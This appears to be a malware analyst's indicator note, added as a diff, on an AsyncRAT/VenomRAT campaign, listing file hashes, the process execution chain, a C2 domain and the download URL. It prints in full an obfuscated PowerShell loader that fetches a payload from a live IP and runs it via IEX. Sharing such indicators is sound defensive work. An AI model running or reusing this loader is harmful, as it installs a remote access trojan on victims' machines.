@@ -1,0 +1,30 @@
+AsyncRAT 2022 | VenomRAT 5.0.3 | Venom Clients | 21.02.2022
+
+************************************************************************************************************
+
+.iso 06cd1e75f05d55ac1ea77ef7bee38bb3b748110b79128dab4c300f1796a2b941
+.vbs 717e93d21b7e30d00dab94fa41f5a2348976ce7841c3223ced3675495ad9bdee
+.ps1 4c931df5f954255a53bbce3cd6df02b644bbfae6f9e4a653610f35f692bf0e8b
+
+Exec >
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\LUBR302JKMSA.vbs
+
+PowErshEll.ExE $HJDRFVOXNITVXVHWUEOKZOF = '[&10-%_0^*=}7%1#{0{%<14y&10-%_0^*=}7%1#{0{%<14t03*\-_%0/=*{)&^%[5)$)_{6}9008<#!\(@14#!1!3!#.IO.&10-%_0^*=}7%1#{0{%<14t=1+^8([9@_<$=86*])19-403*\-_%0/=*{)&^%[5)$)_)+#[9}\0!(%)@*78#[$+!]{6}9008<#!\(@14#!1!3!#=1+^8([9@_<$=86*])19-403*\-_%0/=*{)&^%[5)$)_)+#[9}\0!(%)@*78#[$+!]d03*\-_%0/=*{)&^%[5)$)_=1+^8([9@_<$=86*])19-4]'.Replace('&10-%_0^*=}7%1#{0{%<14','S').Replace('03*\-_%0/=*{)&^%[5)$)_','E').Replace('=1+^8([9@_<$=86*])19-4','R').Replace(')+#[9}\0!(%)@*78#[$+!]','A').Replace('{6}9008<#!\(@14#!1!3!#','M');$HTKCBIFEZPXXJXWLNJJYYXV = ($HJDRFVOXNITVXVHWUEOKZOF -Join '')|&('I'+'EX');$HTILYSKZTGWAVKSZBQYCHXW = '[/3[)!_86}2{-]72<&)2!64y/3[)!_86}2{-]72<&)2!64})4]!!^=1<8}@4$4^7)#=&=-6751&#!9*#8-#_<(-8&[m.N=-6751&#!9*#8-#_<(-8&[})4]!!^=1<8}@4$4^7)#=&.W=-6751&#!9*#8-#_<(-8&[bR=-6751&#!9*#8-#_<(-8&[qu=-6751&#!9*#8-#_<(-8&[/3[)!_86}2{-]72<&)2!64})4]!!^=1<8}@4$4^7)#=&]'.Replace('/3[)!_86}2{-]72<&)2!64','S').Replace('=-6751&#!9*#8-#_<(-8&[','E').Replace('})4]!!^=1<8}@4$4^7)#=&','T');$HNLSQXRCNHRZUIHHEBDQTUZ = ($HTILYSKZTGWAVKSZBQYCHXW -Join '')|&('I'+'EX');$HABGAYHJQOIEEOQHDFDOGHG = '8%)\3-$127{178^]$\^-=^r=_@[7$@[9/&\{43*#\50\]a4<#]$004316=-/&7*<_7\}=_@[7$@[9/&\{43*#\50\]'.Replace('8%)\3-$127{178^]$\^-=^','C').Replace('=_@[7$@[9/&\{43*#\50\]','E').Replace('4<#]$004316=-/&7*<_7\}','T');$HRTPYLBUYJFZTSZLEBIJJZK = '%0$@{]&((#(}*#$013*5]&=2@526!6_=/9&4$3^#(%#-tR=2@526!6_=/9&4$3^#(%#-5\@5-8/*){//*#<_[!9$=]pon5\@5-8/*){//*#<_[!9$=]=2@526!6_=/9&4$3^#(%#-'.Replace('%0$@{]&((#(}*#$013*5]&','G').Replace('=2@526!6_=/9&4$3^#(%#-','E').Replace('5\@5-8/*){//*#<_[!9$=]','S');$HTTYHHUQPCDYRZPONRHARXJ = 'G!*&23}*97<18149#@1<^7&t[(%&\/]68)}=/0{}]=*075!*&23}*97<18149#@1<^7&]9[![/*5*$4<\%-]$37335pon]9[![/*5*$4<\%-]$37335!*&23}*97<18149#@1<^7&]9[![/*5*$4<\%-]$37335t[(%&\/]68)}=/0{}]=*075!*&23}*97<18149#@1<^7&am'.Replace(']9[![/*5*$4<\%-]$37335','S').Replace('!*&23}*97<18149#@1<^7&','E').Replace('[(%&\/]68)}=/0{}]=*075','R');$HORIAUHAQEQXSQYNVPQTRZE = '/_$_)1=73*/}=/**\)@1-@$95<)*49\\0+){390[%2*8a{5*}8!}/\7#*86^_#53}_1To$95<)*49\\0+){390[%2*8n{5*}8!}/\7#*86^_#53}_1'.Replace('/_$_)1=73*/}=/**\)@1-@','R').Replace('$95<)*49\\0+){390[%2*8','E').Replace('{5*}8!}/\7#*86^_#53}_1','D');&('I'+'EX')($HTKCBIFEZPXXJXWLNJJYYXV::new($HNLSQXRCNHRZUIHHEBDQTUZ::$HABGAYHJQOIEEOQHDFDOGHG('http://3.145.46.6/M/ServerREW.txt').$HRTPYLBUYJFZTSZLEBIJJZK().$HTTYHHUQPCDYRZPONRHARXJ()).$HORIAUHAQEQXSQYNVPQTRZE())
+
+powershell.exe -nologo -ExecutionPolicy UNRESTriCTeD -File C:\ProgramData\JJVXCDAUCHAIHBIEPXDBCS\JJVXCDAUCHAIHBIEPXDBCS.ps1
+
+wscript.exe" "C:\ProgramData\JJVXCDAUCHAIHBIEPXDBCS\JJVXCDAUCHAIHBIEPXDBCS.vbs
+
+cmd.exe /c C:\ProgramData\JJVXCDAUCHAIHBIEPXDBCS\JJVXCDAUCHAIHBIEPXDBCS.bat
+
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command & 'C:\ProgramData\JJVXCDAUCHAIHBIEPXDBCS\GOAGGPXWTREEEOZAACHQCE.ps1
+
+
+
+Network
+
+http://3.145.46.6/M/ServerREW.txt
+
+c2
+ghankall40.duckdns.org:8890
